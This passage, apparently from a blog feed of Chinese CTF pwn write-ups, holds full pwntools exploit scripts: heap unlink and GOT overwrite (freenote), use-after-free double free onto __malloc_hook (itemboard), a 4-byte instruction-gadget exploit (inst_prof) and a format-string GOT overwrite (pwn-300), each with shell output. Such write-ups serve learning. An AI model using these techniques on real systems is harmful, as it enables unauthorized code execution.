class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    cn = process(&quot;./freenote_x86&quot;)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line"></span><br><span class="line">def list_post():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def add_post(length,content):</span><br><span class="line">    cn.sendline(&apos;2&apos;)</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_post(idx,length,content):</span><br><span class="line">    cn.sendline(&apos;3&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_post(idx):</span><br><span class="line">    cn.sendline(&apos;4&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">#chunk_list=0x0804A2EC</span><br><span class="line">#test=0x08048CC5</span><br><span class="line"></span><br><span class="line">#-------init-------</span><br><span class="line">for i in range(5):</span><br><span class="line">    add_post(0x80,str(i)*0x80)</span><br><span class="line"></span><br><span class="line">del_post(3)</span><br><span class="line">del_post(1)</span><br><span class="line"></span><br><span class="line">pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8</span><br><span class="line">edit_post(0,0x88,pay)</span><br><span class="line">#------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;a&apos;*0x8)</span><br><span class="line">leak_addr = u32(cn.recv(4))</span><br><span class="line">cn.recv()</span><br><span class="line">heap_base = leak_addr - 0xdb0#offset</span><br><span class="line">chunk0_addr = heap_base + 0x18</span><br><span class="line">success(&quot;leak_addr: &quot;+hex(leak_addr))</span><br><span class="line">success(&quot;heap_base: &quot;+hex(heap_base))</span><br><span class="line">success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#-------unlink--------</span><br><span class="line">pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)</span><br><span class="line">pay += p32(0x80) + p32(0x88+0x88)</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">del_post(1)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)</span><br><span class="line">pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])</span><br><span class="line">pay += &apos;\x00&apos;*(0x88-len(pay))</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;0. &apos;)</span><br><span class="line">cn.recvuntil(&apos;1. &apos;)</span><br><span class="line">strtol = cn.recvuntil(&apos;\x0a&apos;)[:-1]</span><br><span class="line">cn.recv()</span><br><span class="line">strtol = u32(strtol)</span><br><span class="line">system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&quot;strtol: &quot;+hex(strtol))</span><br><span class="line">success(&quot;system: &quot;+hex(system))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------hijack&amp;getshell--------</span><br><span class="line">edit_post(1,4,p32(system))</span><br><span class="line">cn.sendline(&quot;$0&quot;)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>获得shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your choice: $ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="itemboard"><a href="#itemboard" class="headerlink" title="itemboard"></a>itemboard</h1><p><em>2019.2.28</em><br><em>一个重要的洞没有注意到，因此做的很麻烦，而且或许是因为one_gadget的条件不够，将其覆盖到malloc hook之后仍然无法getshell，不过也把这个做法记录下来</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>功能 add list show remove</p><p>程序会在初始时malloc一块内存来存放之后的指针</p><p>add 会malloc(0x18)，分别存放name,description,及单独的free函数的指针，之后再malloc(0x20)，存放name，然后读取用户输入size，malloc(size)</p><p>list 会显示所有的item的name</p><p>show 显示用户想要显示的item的name 及description，没有检查inuse</p><p>remove()按序将特定的item的三个指针依次free，但是没有清空即UAF漏洞，同时可以因此double free，但因为add remove都是三个chunk在，所以会比较麻烦</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>因为指针也在堆地区，同时用户可以自由选择des大小，所以想办法将之前的存放指针的地址给用户，就有了一定的泄露地址能力</p><p>也可以想办法将指针指向free后的smallbin，也可以泄露libc</p><p>double free 可以因此将chunk分配到heap以外，即可以将之伪造到malloc hook之上，覆盖为one_gadget</p><p>思路比较简单，但是执行起来复杂度高，且最后没有成功getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp 1"></a>exp 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./itemboard&apos;)</span><br><span class="line">#sh =remote(&apos;pwn2.jarvisoj.com&apos;,&apos;9887&apos;)</span><br><span class="line">elf = ELF(&apos;./itemboard&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(name,size,des):</span><br><span class="line">sh.sendlineafter(&apos;:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;name?\n&apos;,name)</span><br><span class="line">sh.sendlineafter(&apos;len?\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Description?\n&apos;,des)</span><br><span class="line"></span><br><span class="line">def list():</span><br><span class="line">sh.sendlineafter(&apos;:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;item?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">sh.sendlineafter(&apos;:\n&apos;,&apos;4&apos;)</span><br><span class="line">sh.sendlineafter(&apos;item?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;,0x20,&apos;b&apos;*0x10)</span><br><span class="line">add(&apos;c&apos;,0x20,&apos;d&apos;*0x10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;e&apos;,0x10,&apos;f&apos;*9)</span><br><span class="line">add(&apos;h&apos;,0x100,&apos;i&apos;*9)</span><br><span class="line">add(&apos;A&apos;,0X60,&apos;A&apos;)</span><br><span class="line">add(&apos;B&apos;,0X60,&apos;B&apos;)</span><br><span class="line">add(&apos;f&apos;,0x100,&apos;g&apos;*0x90)</span><br><span class="line"></span><br><span class="line">#----------leak heap base---------------------------</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">add(&apos;g&apos;,0,&apos;&apos;)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(&apos;Description:&apos;)</span><br><span class="line">leak_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">heap_base = leak_addr-0x560</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap_base)</span><br><span class="line"></span><br><span class="line">#---------leak libc addr----------------------------</span><br><span class="line">remove(3)</span><br><span class="line">remove(0)</span><br><span class="line">add(&apos;g&apos;,9,p64(heap_base+0x690))</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(&apos;Name:&apos;)</span><br><span class="line">leak_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">main_arena = leak_addr - 88</span><br><span class="line">libc_addr = main_arena - 0x3c4b20</span><br><span class="line">one_gadget = libc_addr + 0xea36d #0x46428 #0xe9415</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">print &apos;libc_addr: &apos;+hex(libc_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------double free to getshell-----------------</span><br><span class="line">add(&apos;a&apos;,0x20,&apos;a&apos;)</span><br><span class="line">add(&apos;v&apos;,0x20,&apos;v&apos;)</span><br><span class="line"></span><br><span class="line">remove(4)</span><br><span class="line">remove(5)</span><br><span class="line">remove(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;a&apos;*8+p64(0x21),0x60,p64(main_arena-0x33))</span><br><span class="line">add(&apos;\x00&apos;*8,0x60,&apos;\x00&apos;)</span><br><span class="line">add(&apos;zz&apos;,0x60,&apos;kkk&apos;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(&apos;AAA&apos;,0x60,&apos;c&apos;*0x13+p64(one_gadget))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#add(&apos;a&apos;,0x100,&apos;a&apos;)</span><br><span class="line">#remove(3)</span><br><span class="line">#remove(3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="inst-prof"><a href="#inst-prof" class="headerlink" title="inst_prof"></a>inst_prof</h1><p>神一般的题，google ctf质量真的不一般。。。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>开始一个无限循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  if ( write(1, &quot;initializing prof...&quot;, 0x14uLL) == 20 )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(5u);</span><br><span class="line">    alarm(0x1Eu);</span><br><span class="line">    if ( write(1, &quot;ready\n&quot;, 6uLL) == 6 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">        do_test();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点do_test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int do_test()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // rbx</span><br><span class="line">  char v1; // al</span><br><span class="line">  unsigned __int64 v2; // r12</span><br><span class="line">  unsigned __int64 buf; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v0 = alloc_page();</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)v0 = *(_QWORD *)&amp;template;</span><br><span class="line">  v0[2] = *((_DWORD *)&amp;template + 2);</span><br><span class="line">  v1 = *(&amp;template + 14);</span><br><span class="line">  *((_WORD *)v0 + 6) = *((_WORD *)&amp;template + 6);</span><br><span class="line">  *((_BYTE *)v0 + 14) = v1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  read_inst((__int64)v0 + 5);                   // 4 byte</span><br><span class="line">  make_page_executable(v0);</span><br><span class="line"></span><br><span class="line">  v2 = __rdtsc();</span><br><span class="line">  ((void (__fastcall *)(_DWORD *))v0)(v0);      // exec</span><br><span class="line">  buf = __rdtsc() - v2;</span><br><span class="line"></span><br><span class="line">  if ( write(1, &amp;buf, 8uLL) != 8 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return free_page(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> template:                               ; DATA XREF: do_test+15↑o</span><br><span class="line">.rodata:0000000000000C00                 mov     ecx, 1000h</span><br><span class="line">.rodata:0000000000000C05</span><br><span class="line">.rodata:0000000000000C05 loc_C05:                             </span><br><span class="line">.rodata:0000000000000C05                 nop</span><br><span class="line">.rodata:0000000000000C06                 nop</span><br><span class="line">.rodata:0000000000000C07                 nop</span><br><span class="line">.rodata:0000000000000C08                 nop                       &lt;-----输入的四个字节在这里</span><br><span class="line">.rodata:0000000000000C09                 sub     ecx, 1</span><br><span class="line">.rodata:0000000000000C0C                 jnz     short loc_C05</span><br><span class="line">.rodata:0000000000000C0E                 retn</span><br></pre></td></tr></table></figure><p>简单来说就是执行输入的四个字节0x1000次。。。。中间需要防止程序直接exit</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.arch=&apos;amd64&apos; </span><br><span class="line">dec_r14=asm(&apos;dec r14&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">inc_r14=asm(&apos;inc r14&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">mov_r14_rsp=asm(&apos;mov r14,rsp&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">mov_r14_rr14=asm(&apos;mov r14,[r14]&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">mov_rrsp_r14=asm(&apos;mov [rsp],r14&apos;) </span><br><span class="line"></span><br><span class="line">debug=0</span><br><span class="line">if debug: </span><br><span class="line">p=process(&apos;./inst_prof&apos;) #gdb.attach(proc.pidof(p)[0]) </span><br><span class="line">offset=0xD691F-0x202B1 </span><br><span class="line">context.log_level=&apos;debug&apos; </span><br><span class="line">else: </span><br><span class="line">#p = process(&apos;./inst_prof&apos;)</span><br><span class="line">p=remote(&apos;pwn2.jarvisoj.com&apos;, 9893) </span><br><span class="line">#offset=0xEA36D-0x21F45 </span><br><span class="line">offset=0x4647C-0x21F45 </span><br><span class="line">def exe(es): </span><br><span class="line">p.send(es) </span><br><span class="line">p.recvuntil(&apos;\x00\x00\x00&apos;) </span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;initializing prof...&apos;) </span><br><span class="line">p.recvuntil(&apos;ready&apos;) </span><br><span class="line">exe(mov_r14_rsp) </span><br><span class="line">for i in range(64): </span><br><span class="line">exe(inc_r14) </span><br><span class="line">exe(mov_r14_rr14) </span><br><span class="line">t1=int(int(offset/0x1000)/2) </span><br><span class="line">t2=offset-t1*0x1000*2 </span><br><span class="line">add_t1=asm(&apos;add r14,%d&apos;%t1) </span><br><span class="line">print(t1) </span><br><span class="line">exe(add_t1) </span><br><span class="line">exe(add_t1) </span><br><span class="line">print(&apos;start inc!&apos;) </span><br><span class="line">print(t2) </span><br><span class="line">for i in range(t2): </span><br><span class="line">exe(inc_r14) </span><br><span class="line">p.send(mov_rrsp_r14) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwn-300-Formatting string vulnerability</title>
      <link href="/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/"/>
      <url>/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/</url>
      <content type="html"><![CDATA[<p><em>pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。</em><br><em>而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。</em></p><h1 id="查看内容及保护"><a href="#查看内容及保护" class="headerlink" title="查看内容及保护"></a>查看内容及保护</h1><h2 id="main函数为："><a href="#main函数为：" class="headerlink" title="main函数为："></a>main函数为：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+Ch] [ebp-4Ch]</span><br><span class="line">  unsigned int v5; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);  //canary生成</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  fgets(&amp;s, 64, stdin);   //fgets,遇/x00停止</span><br><span class="line">  printf(&amp;s);             //格式化字符串漏洞</span><br><span class="line">  fgets(&amp;s, 64, stdin);</span><br><span class="line">  printf(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查看文件保护"><a href="#查看文件保护" class="headerlink" title="查看文件保护"></a>查看文件保护</h2><p>仍然是canary 与 栈不可执行；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# checksec binary_300</span><br><span class="line">[*] &apos;/root/tikool/binary_300&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="查看加载函数"><a href="#查看加载函数" class="headerlink" title="查看加载函数"></a>查看加载函数</h2><p>发现system函数</p><figure class="image-box">                <img src="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/system.png" alt="加载函数" title="" class="">                <p>加载函数</p>            </figure><h1 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h1><p>想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell；</p><h1 id="流程实现"><a href="#流程实现" class="headerlink" title="流程实现"></a>流程实现</h1><h2 id="确定字符串位置"><a href="#确定字符串位置" class="headerlink" title="确定字符串位置"></a>确定字符串位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# ./binary_300</span><br><span class="line">aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x </span><br><span class="line">aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e</span><br></pre></td></tr></table></figure><p>即字符串位于第六（相对于<strong>）或第七个（相对于</strong>）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./binary_300&apos;)</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)</span><br><span class="line">libc = ELF(&apos;./binary_300&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = libc.got[&apos;printf&apos;]</span><br><span class="line">system_add = libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;)  //pwntools自带，用于生成格式化字符串payload；</span><br><span class="line"></span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ /bin/sh</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> format </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn 1.3--ret2libc practice</title>
      <link href="/2018/08/28/Introduction%20to%20pwn%201.3--ret2libc%20practice/"/>
      <url>/2018/08/28/Introduction%20to%20pwn%201.3--ret2libc%20practice/</url>
